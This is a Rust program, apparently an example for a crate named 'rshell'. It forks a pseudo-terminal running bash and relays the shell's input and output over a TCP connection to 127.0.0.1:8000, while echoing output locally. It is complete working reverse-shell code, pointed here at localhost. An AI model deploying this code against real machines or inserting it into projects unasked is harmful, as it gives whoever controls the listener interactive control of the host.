use std::convert::TryFrom;
use std::ffi::CString;
use std::io::{Error, Result};
use std::ptr::null;

use tokio::io::{duplex, AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::{io, select};
use tokio_fd::AsyncFd;

use rshell::*;

#[tokio::main]
async fn main() -> Result<()> {
    let tcpstream = TcpStream::connect("127.0.0.1:8000").await?;
    tcpstream.set_nodelay(true)?;

    let (pty_master, pid) = term::fork_pty()?;
    unsafe { term::PTY_MASTER = Some(pty_master) };

    if pid == 0 {
        let exe = CString::new("/usr/bin/env").unwrap();
        let argv: Vec<_> = vec!["", "bash"]
            .iter()
            .map(|&x| CString::new(x).unwrap())
            .collect();
        let mut argv: Vec<_> = argv.iter().map(|x| x.as_ptr()).collect();
        argv.push(null());
        unsafe {
            libc::execv(exe.as_ptr(), argv.as_ptr());
        }
        return Err(Error::last_os_error());
    }

    term::setup_terminal(pty_master, true)?;
    let pty = AsyncFd::try_from(pty_master)?;
    let (pty_reader, pty_writer) = &mut io::split(pty);
    let (tcp_reader, tcp_writer) = &mut io::split(tcpstream);

    let stdin = &mut AsyncFd::try_from(libc::STDIN_FILENO)?;
    let stdout = &mut AsyncFd::try_from(libc::STDOUT_FILENO)?;

    let (mut ds1, mut ds2) = duplex(1024);

    let link1 = async {
        let buf = &mut vec![0; 512];
        loop {
            let n = pty_reader.read(buf).await?;
            ds1.write_all(&buf[..n]).await?;
            tcp_writer.write_all(&buf[..n]).await?;
        }
    };

    let link2 = async { io::copy(tcp_reader, pty_writer).await.map(drop) };

    let echo = async {
        let buf = &mut vec![0; 512];
        loop {
            let n = ds2.read(buf).await?;
            stdout.write_all(&buf[..n]).await?;
        }
    };

    let read = async {
        let buf = &mut vec![0; 512];
        Ok(loop {
            if stdin.read(buf).await? == 0 {
                break;
            }
        })
    };

    select! {
        a = link1 => {
            a
        }
        b = link2 => {
            b
        }
        c = echo => {
            c
        }
        d = read => {
            d
        }
    }
}
